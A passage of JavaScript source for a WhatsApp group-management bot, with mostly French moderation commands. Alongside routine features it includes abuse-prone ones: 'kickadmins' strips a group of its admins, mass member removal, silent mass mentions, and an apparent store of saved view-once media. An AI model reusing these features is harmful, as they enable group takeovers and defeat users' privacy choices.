        }
        break;

        }

      case 'welcome':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminWelcome = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminWelcome && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsWelcome = getGroupSettings(remoteJid);
        settingsWelcome.welcome = !settingsWelcome.welcome;
        saveData();

        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    👋 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
╚═══════════════════════════════════╝

📊 *Statut:* ${settingsWelcome.welcome ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${settingsWelcome.welcome ? '✅ Les nouveaux membres recevront un message de bienvenue élégant with:\n\n• Nom du groupe\n• Nombre de membres\n• Liste des admins\n• Règles du groupe\n• Date et heure' : '❌ Les nouveaux membres ne recevront plus de message de bienvenue'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     SEIGNEUR TD`
        });
        break;

      case 'goodbye':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminGoodbye = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminGoodbye && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const settingsGoodbye = getGroupSettings(remoteJid);
        settingsGoodbye.goodbye = !settingsGoodbye.goodbye;
        saveData();

        await sock.sendMessage(remoteJid, {
          text: `╔═══════════════════════════════════╗
║    💨 𝗚𝗢𝗢𝗗𝗕𝗬𝗘 𝗦𝗬𝗦𝗧𝗘𝗠      ║
╚═══════════════════════════════════╝

📊 *Statut:* ${settingsGoodbye.goodbye ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}

${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quelqu\'un quitte with:\n\n• Nom du groupe\n• Nombre de membres restants\n• Liste des admins\n• Informations utiles\n• Date et heure' : '❌ Plus de message d\'au revoir quand quelqu\'un quitte'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     SEIGNEUR TD`
        });
        break;

      case 'listactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter l'activité de tous les membres
          const activityList = [];
          for (const participant of participants) {
            const activity = groupActivity.get(participant.id);
            
            if (activity && activity.messageCount > 0) {
              activityList.push({
                jid: participant.id,
                count: activity.messageCount,
                last: activity.lastMessage
              });
            }
          }
          
          // Trier par nombre de messages (décroissant)
          activityList.sort((a, b) => b.count - a.count);
          
          // Top 3
          const top3 = activityList.slice(0, 3);
          const activeCount = activityList.length;
          
          // Date et heure
          const now = new Date();
          const dateStr = now.toLocaleDateString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          });
          const timeStr = now.toLocaleTimeString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          let listText = `✨ ┏━━━━━━━ 📊 🄻🄸🅂🅃🄴 🄰🄲🅃🄸🅅🄴 ━━━━━━━┓ ✨
🏆 ＴＯＰ ＣＨＡＴＴＥＲＳ ＤＵ ＭＯＭＥＮＴ 🏆\n`;

          if (top3.length > 0) {
            const medals = ['🥇', '🥈', '🥉'];
            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
            const emojis = ['✨', '⚡', '❄️'];
            
            top3.forEach((member, index) => {
              listText += `${emojis[index]} ${medals[index]} ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
              listText += `╰── 💬 ${member.count} 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌\n`;
            });
          } else {
            listText += `⚠️ Aucune activité détectée encore.\n`;
          }
          
          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 𝖲𝗍𝖺𝗍𝗂𝗌𝗍𝗂𝗊𝗎𝖾𝗌 𝖦𝗅𝗈𝖻𝖺𝗅𝖾𝗌 :
👥 𝖬𝖾𝗆𝖻𝗋𝖾𝗌 𝖠𝖼𝗍𝗂𝗏𝖾𝗌 : ${activeCount}/${participants.length}
📈 𝖳𝖾𝗇𝖽𝖺𝗇𝖼𝖾 : ${((activeCount / participants.length) * 100).toFixed(1)}%
📅 𝖬𝗂𝗌𝖾 𝖺̀ 𝗃𝗈𝗎𝗋 : ${dateStr} | ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
💠 𝕯𝖊𝖛𝖊𝖑𝖔𝖕𝖕𝖊𝖉 𝖇𝖞 @${superadmin.split('@')[0]} 💠`;

          const mentions = top3.map(m => m.jid).concat([superadmin]);
          
          await sock.sendMessage(remoteJid, {
            text: listText,
            mentions: mentions
          });
        } catch (error) {
          console.error(' listactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'listinactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        try {
          const threshold = args[0] ? parseInt(args[0]) : 7; // Par défaut 7 jours
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          const superadmin = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id || 'Unknown';
          
          const now = Date.now();
          const thresholdMs = threshold * 24 * 60 * 60 * 1000; // Jours en millisecondes
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter les inactifs
          const inactiveList = [];
          for (const participant of participants) {
            const activity = groupActivity.get(participant.id);
            
            if (!activity || (now - activity.lastMessage) > thresholdMs) {
              const daysSinceLastMessage = activity 
                ? Math.floor((now - activity.lastMessage) / (24 * 60 * 60 * 1000))
                : 999; // Jamais parlé
              
              inactiveList.push({
                jid: participant.id,
                days: daysSinceLastMessage
              });
            }
          }
          
          // Trier par inactivité (décroissant)
          inactiveList.sort((a, b) => b.days - a.days);
          
          // Top 3
          const top3 = inactiveList.slice(0, 3);
          const inactiveCount = inactiveList.length;
          
          // Date et heure
          const nowDate = new Date();
          const dateStr = nowDate.toLocaleDateString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric'
          });
          const timeStr = nowDate.toLocaleTimeString('fr-FR', {
            timeZone: 'America/Port-au-Prince',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          let listText = `⚠️ ┏━━━━━━━ ⚡ 🅂🄲🄰🄽 🄸🄽🄰🄲🅃🄸🄵 ━━━━━━━┓ ⚠️
🌑 ＭＥＭＢＲＥＳ ＥＮ ＳＯＭＭＥＩＬ 🌑\n`;

          if (top3.length > 0) {
            const ranks = ['𝟭𝗲𝗿', '𝟮𝗲̀𝗺𝗲', '𝟯𝗲̀𝗺𝗲'];
            
            top3.forEach((member, index) => {
              const daysText = member.days >= 999 ? 'Jamais actif' : `${member.days} 𝗃𝗈𝗎𝗋𝗌`;
              listText += `🛑 ${ranks[index]} : @${member.jid.split('@')[0]}\n`;
              listText += `╰── ⏳ 𝖣𝖾𝗋𝗇𝗂𝖾𝗋 𝗆𝗌𝗀 : ${daysText}\n`;
            });
          } else {
            listText += `✅ Tous les membres sont actifs!\n`;
          }
          
          listText += `━━━━━━━━━━━━━━━━━━━━━━━━━━
📉 𝖤́𝗍𝖺𝗍 𝖽𝗎 𝖲𝗒𝗌𝗍𝖾̀𝗆𝖾 :
💤 𝖨𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝖽𝖾́𝗍𝖾𝖼𝗍𝖾́𝗌 : ${inactiveCount}/${participants.length}
⚙️ 𝖲𝖾𝗎𝗂𝗅 𝖽𝖾 𝗍𝗈𝗅𝖾́𝗋𝖺𝗇𝖼𝖾 : ${threshold} 𝗃𝗈𝗎𝗋𝗌
🚨 𝖠𝗍𝗍𝖾𝗇𝗍𝗂𝗈𝗇 : 𝖫𝖾𝗌 𝗆𝖾𝗆𝖻𝗋𝖾𝗌 𝗂𝗇𝖺𝖼𝗍𝗂𝖿𝗌 𝗋𝗂𝗌𝗊𝗎𝖾𝗇𝗍
𝗎𝗇𝖾 𝖾𝗑𝗉𝗎𝗅𝗌𝗂𝗈𝗇 𝖺𝗎𝗍𝗈𝗆𝖺𝗍𝗂𝗊𝗎𝖾.
📅 ${dateStr} | ${timeStr}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
💠 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖉𝖒𝖎𝖓 : @${superadmin.split('@')[0]} 💠`;

          const mentions = top3.map(m => m.jid).concat([superadmin]);
          
          await sock.sendMessage(remoteJid, {
            text: listText,
            mentions: mentions
          });
        } catch (error) {
          console.error(' listinactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'kickinactive':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const isUserAdminKickInactive = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminKickInactive && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const botIsAdminKickInactive = await isBotGroupAdmin(sock, remoteJid);
        if (!botIsAdminKickInactive) {
          await sock.sendMessage(remoteJid, { text: '❌ Je dois être admin' });
          break;
        }

        try {
          const thresholdDays = args[0] ? parseInt(args[0]) : 7;
          const metadata = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants;
          
          const now = Date.now();
          const thresholdMs = thresholdDays * 24 * 60 * 60 * 1000;
          
          // Obtenir l'activité pour ce groupe
          const groupActivity = memberActivity.get(remoteJid) || new Map();
          
          // Collecter les inactifs à expulser
          const toKick = [];
          for (const participant of participants) {
            // Ne pas expulser les admins
            if (participant.admin) continue;
            
            const activity = groupActivity.get(participant.id);
            
            if (!activity || (now - activity.lastMessage) > thresholdMs) {
              toKick.push(participant.id);
            }
          }
          
          if (toKick.length === 0) {
            await sock.sendMessage(remoteJid, {
              text: `✅ Aucun membre inactif détecté (seuil: ${thresholdDays} jours)`
            });
            break;
          }
          
          await sock.sendMessage(remoteJid, {
            text: `⚡ Expulsion des membres inactifs...\n\n🎯 ${toKick.length} membre(s) seront expulsés`
          });
          
          // Expulser par batch de 10
          let kicked = 0;
          for (let i = 0; i < toKick.length; i += 10) {
            const batch = toKick.slice(i, i + 10);
            try {
              await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
              kicked += batch.length;
              await delay(1000);
            } catch (error) {
              console.error(' kicking batch:', error);
            }
          }
          
          await sock.sendMessage(remoteJid, {
            text: `╔═══════════════════════════════════╗
║   ⚡ 𝗞𝗜𝗖𝗞 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧  ║
╚═══════════════════════════════════╝

✅ *Expulsions effectuées:* ${kicked}/${toKick.length}
⏰ *Seuil d'inactivité:* ${thresholdDays} jours
📊 *Membres restants:* ${participants.length - kicked}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     SEIGNEUR TD`
          });
        } catch (error) {
          console.error(' kickinactive:', error);
          await sock.sendMessage(remoteJid, { text: '❌ ' });
        }
        break;

      case 'autoreact':
        await handleAutoReactCommand(sock, args, remoteJid, senderJid, _saveState, autoReact);
        break;

      case 'tagall':
        await handleTagAll(sock, message, args, remoteJid, isGroup, senderJid);
        break;

      case 'tagadmins':
      case 'tagadmin':
      case 'pingtag': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
          if (admins.length === 0) {
            await sock.sendMessage(remoteJid, { text: '❌ Aucun admin trouvé dans ce groupe.' });
            break;
          }
          const adminJids = admins.map(a => a.id);
          const customMsg = args.join(' ') || '';
          let adminList = '';
          admins.forEach((a, i) => {
            const tag = a.admin === 'superadmin' ? '♛' : '🛡️';
            adminList += `  ${tag} @${a.id.split('@')[0]}\n`;
          });

          await sock.sendMessage(remoteJid, {
            text:
`⌬ ━━━━━ 🛡️ ᴀᴅᴍɪɴ_ʙʀᴏᴀᴅᴄᴀꜱᴛ ━━━━━ ⌬

  ✧⚚✧ ɢʀᴏᴜᴘᴇ : 『 ${metadata.subject} 』
  👥 ᴀᴅᴍɪɴꜱ : ${admins.length}

  ╔⟡───────────────────────────⟡╗
  ⟁ 🛡️ ᴀᴅᴍɪɴ_ʟɪꜱᴛ :
${adminList}  ╚⟡───────────────────────────⟡╝
${customMsg ? `\n  📢 ${customMsg}\n` : ''}
  ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
  🜲 ꜱᴛᴀᴛᴜꜱ : ᴄᴏɴɴᴇᴄᴛᴇᴅ |  ᴏɴʟɪɴᴇ`,
            mentions: adminJids
          });
          try { await sock.sendMessage(remoteJid, { react: { text: '🛡️', key: message.key } }); } catch(e) {}
        } catch(e) {
          console.error('[tagadmins]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'kickadmins':
      case 'kickadmin':
      case 'removeadmins': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        if (!isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Sèlman owner/admin ki ka fè sa.' });
          break;
        }
        try {
          const metadata = await sock.groupMetadata(remoteJid);
          const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
          // Exclure le bot lui-même et le superadmin (owner du groupe)
          const adminsToKick = metadata.participants.filter(p =>
            (p.admin === 'admin') &&
            p.id !== botJid &&
            !isAdmin(p.id)
          );

          if (adminsToKick.length === 0) {
            await sock.sendMessage(remoteJid, { text: '❌ Aucun admin à expulser.' });
            break;
          }

          await sock.sendMessage(remoteJid, {
            text: `⚙️ Expulsion de ${adminsToKick.length} admin(s) en cours...`
          });

          let kicked = 0;
          for (const admin of adminsToKick) {
            try {
              await sock.groupParticipantsUpdate(remoteJid, [admin.id], 'remove');
              kicked++;
              await delay(800);
            } catch(e) { console.error('[kickadmins] skip:', admin.id, e.message); }
          }

          await sock.sendMessage(remoteJid, {
            text:
`✅ *KickAdmins terminé !*
━━━━━━━━━━━━━━━━━━━━━━━
🛡️ Admins expulsés : ${kicked}/${adminsToKick.length}
━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD_`
          });
        } catch(e) {
          console.error('[kickadmins]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'hidetag':
      case 'htag':
      case 'invisibletag': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        try {
          const metadata     = await sock.groupMetadata(remoteJid);
          const participants = metadata.participants.map(p => p.id);
          const tagMsg       = args.join(' ') || '';

          await sock.sendMessage(remoteJid, {
            text:     tagMsg || '⁠',
            mentions: participants
          });

          try { await sock.sendMessage(remoteJid, { react: { text: '👻', key: message.key } }); } catch(e) {}
        } catch(e) {
          console.error('[hidetag]', e.message);
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      case 'kickall':
        await handleKickAll(sock, remoteJid, isGroup, senderJid);
        break;

      case 'leave':
        await handleLeave(sock, remoteJid, isGroup, senderJid);
        break;

      case 'status':
        await sock.sendMessage(remoteJid, {
          text: `📊 *Statut du Bot*

🤖 : ${botMode}
⌨️ Typing: ${autoTyping ? 'ON' : 'OFF'}
🎙️ Recording: ${autoRecording ? 'ON' : 'OFF'}
😊 React: ${autoReact ? 'ON' : 'OFF'}
👁️ VV: ${savedViewOnce.get(senderJid)?.length || 0}

👨‍💻 Votre JID:
${senderJid}

🔐 Admin: ${isAdmin(senderJid) ? '✅ OUI' : '❌ NON'}`
        });
        break;

      case 'bible':
        await handleBibleCommand(sock, args, remoteJid);
        break;

      case 'terms':
      case 'termes':
      case 'rules':
        await handleTermsCommand(sock, remoteJid, senderJid);
        break;

      case 'dev':
      case 'developer':
      case 'owner':
      case 'contact':
        await simulateTyping(sock, remoteJid);
        await sendWithImage(sock, remoteJid, 'dev',
`╔═══════════════════════════════════╗
║     👨‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗜𝗡𝗙𝗢     ║
╚═══════════════════════════════════╝

👑 *SEIGNEUR TD* 

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 *CONTACT:*
1️⃣  wa.me/50944908407
2️⃣  wa.me/50943981073
3️⃣  wa.me/67078035882

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💼 *SERVICES:*
• Développement de bots WhatsApp
• Scripts personnalisés
• Support technique & consulting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 SEIGNEUR TD v4.0.0
✨ Made with ❤️ in Haiti `);
        break;

      case 'check':
      case 'checkspam':
      case 'bancheck':
      case 'isbanned':
        await handleCheckBan(sock, args, remoteJid, message, senderJid);
        break;

      // =============================================
      // COMMANDES ANTI
      // =============================================

      case 'antilink':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdmin && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }
        if (!(await isBotGroupAdmin(sock, remoteJid))) {
          await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' });
          break;
        }

        const settings = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          settings.antilink = true;
        } else if (args[0]?.toLowerCase() === 'off') {
          settings.antilink = false;
        } else if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🔗 *Anti-Link* — Statut actuel : ${settings.antilink ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}antilink on/off\n\n*© SEIGNEUR TD*`
          });
          break;
        }
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🔗 *Anti-Link* — Statut : ${settings.antilink ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*`
        });
        break;

      case 'antibot':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminBot = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminBot && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }
        if (!(await isBotGroupAdmin(sock, remoteJid))) {
          await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' });
          break;
        }

        const settingsBot = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          settingsBot.antibot = true;
          saveData();
          await sock.sendMessage(remoteJid, { text: `🤖 *Anti-Bot* — Statut : ✅ ACTIVÉ\n\n*© SEIGNEUR TD*` });
        } else if (args[0]?.toLowerCase() === 'off') {
          settingsBot.antibot = false;
          saveData();
          await sock.sendMessage(remoteJid, { text: `🤖 *Anti-Bot* — Statut : ❌ DÉSACTIVÉ\n\n*© SEIGNEUR TD*` });
        } else {
          await sock.sendMessage(remoteJid, {
            text: `🤖 *Anti-Bot* — Statut actuel : ${settingsBot.antibot ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}antibot on/off\n\n*© SEIGNEUR TD*`
          });
        }
        break;

      case 'antitag':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminTag = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminTag && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }
        if (!(await isBotGroupAdmin(sock, remoteJid))) {
          await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' });
          break;
        }

        const settingsTag = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          settingsTag.antitag = true;
        } else if (args[0]?.toLowerCase() === 'off') {
          settingsTag.antitag = false;
        } else if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🏷️ *Anti-Tag* — Statut actuel : ${settingsTag.antitag ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}antitag on/off\n\n*© SEIGNEUR TD*`
          });
          break;
        }
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🏷️ *Anti-Tag* — Statut : ${settingsTag.antitag ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*`
        });
        break;

      case 'antispam':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminSpam = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminSpam && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }
        if (!(await isBotGroupAdmin(sock, remoteJid))) {
          await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' });
          break;
        }

        const settingsSpam = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          settingsSpam.antispam = true;
        } else if (args[0]?.toLowerCase() === 'off') {
          settingsSpam.antispam = false;
        } else if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🚫 *Anti-Spam* — Statut actuel : ${settingsSpam.antispam ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}antispam on/off\n\n*© SEIGNEUR TD*`
          });
          break;
        }
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🚫 *Anti-Spam* — Statut : ${settingsSpam.antispam ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*`
        });
        break;

      case 'antisticker': {
        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
        const _uaSticker = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!_uaSticker && !isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
        if (!(await isBotGroupAdmin(sock, remoteJid))) { await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' }); break; }
        const _sSticker = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') { _sSticker.antisticker = true; }
        else if (args[0]?.toLowerCase() === 'off') { _sSticker.antisticker = false; }
        saveData();
        await sock.sendMessage(remoteJid, { text: `🗒️ *Anti-Sticker* — ${_sSticker.antisticker ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*` });
        break;
      }

      case 'antiimage': {
        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
        const _uaImage = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!_uaImage && !isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
        if (!(await isBotGroupAdmin(sock, remoteJid))) { await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' }); break; }
        const _sImage = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') { _sImage.antiimage = true; }
        else if (args[0]?.toLowerCase() === 'off') { _sImage.antiimage = false; }
        saveData();
        await sock.sendMessage(remoteJid, { text: `🖼️ *Anti-Image* — ${_sImage.antiimage ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*` });
        break;
      }

      case 'antivideo': {
        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
        const _uaVideo = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!_uaVideo && !isOwner && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
        if (!(await isBotGroupAdmin(sock, remoteJid))) { await sock.sendMessage(remoteJid, { text: '⛔ Je dois être admin du groupe pour activer cette protection.' }); break; }
        const _sVideo = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') { _sVideo.antivideo = true; }
        else if (args[0]?.toLowerCase() === 'off') { _sVideo.antivideo = false; }
        saveData();
        await sock.sendMessage(remoteJid, { text: `🎬 *Anti-Video* — ${_sVideo.antivideo ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*` });
        break;
      }

      case 'antimentiongroupe':
      case 'antimentiongroup':
      case 'antimentionstatus': {
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ Groupe uniquement.' });
          break;
        }
        const isUserAdminAMG = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminAMG && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement.' });
          break;
        }
        const settingsAMG = initGroupSettings(remoteJid);
        if (args[0]?.toLowerCase() === 'on') {
          settingsAMG.antimentiongroupe = true;
        } else if (args[0]?.toLowerCase() === 'off') {
          settingsAMG.antimentiongroupe = false;
        } else if (!args[0]) {
          await sock.sendMessage(remoteJid, {
            text: `🚫 *Anti-Mention Groupe* — Statut actuel : ${settingsAMG.antimentiongroupe ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n💡 Usage: ${config.prefix}antimentiongroupe on/off\n\n*© SEIGNEUR TD*`
          });
          break;
        }
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🚫 *Anti-Mention Groupe* — Statut : ${settingsAMG.antimentiongroupe ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*`
        });
        break;
      }

      case 'warn':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminWarn = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminWarn && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedWarn = getTargetJid(message);
        if (!mentionedWarn) {
          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
          break;
        }

        const reason = args.slice(1).join(' ') || 'Aucune raison spécifiée';
        const settingsWarn = initGroupSettings(remoteJid);
        const warnCount = addWarn(remoteJid, mentionedWarn, reason);
        
        await sock.sendMessage(remoteJid, {
          text: `⚠️ @${mentionedWarn.split('@')[0]} a reçu un avertissement!\n\nRaison: ${reason}\nWarnings: ${warnCount}/${settingsWarn.maxWarns}`,
          mentions: [mentionedWarn]
        });

        if (warnCount >= settingsWarn.maxWarns) {
          const botIsAdminWarn = await isBotGroupAdmin(sock, remoteJid);
          if (botIsAdminWarn) {
            await sock.groupParticipantsUpdate(remoteJid, [mentionedWarn], 'remove');
            await sock.sendMessage(remoteJid, {
              text: `❌ @${mentionedWarn.split('@')[0]} a été expulsé (${settingsWarn.maxWarns} warnings)`,
              mentions: [mentionedWarn]
            });
            resetWarns(remoteJid, mentionedWarn);
          }
        }
        break;

      case 'resetwarn':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }
        
        const isUserAdminReset = await isGroupAdmin(sock, remoteJid, senderJid);
        if (!isUserAdminReset && !isOwner && !isAdmin(senderJid)) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' });
          break;
        }

        const mentionedReset = getTargetJid(message);
        if (!mentionedReset) {
          await sock.sendMessage(remoteJid, { text: `❗ Réponds au message de la personne ou mentionne @user` });
          break;
        }

        resetWarns(remoteJid, mentionedReset);
        await sock.sendMessage(remoteJid, {
          text: `✅ Warnings réinitialisés pour @${mentionedReset.split('@')[0]}`,
          mentions: [mentionedReset]
        });
        break;

      case 'warns':
        if (!isGroup) {
          await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
          break;
        }

        const mentionedWarns = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || senderJid;
        const userWarns = getWarns(remoteJid, mentionedWarns);
        const settingsWarns = initGroupSettings(remoteJid);
        
        if (userWarns.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `✅ @${mentionedWarns.split('@')[0]} n'a aucun avertissement`,
            mentions: [mentionedWarns]
          });
        } else {
          let warnText = `⚠️ Warnings de @${mentionedWarns.split('@')[0]}\n\nTotal: ${userWarns.length}/${settingsWarns.maxWarns}\n\n`;
          userWarns.forEach((warn, index) => {
            const date = new Date(warn.timestamp).toLocaleString('fr-FR');
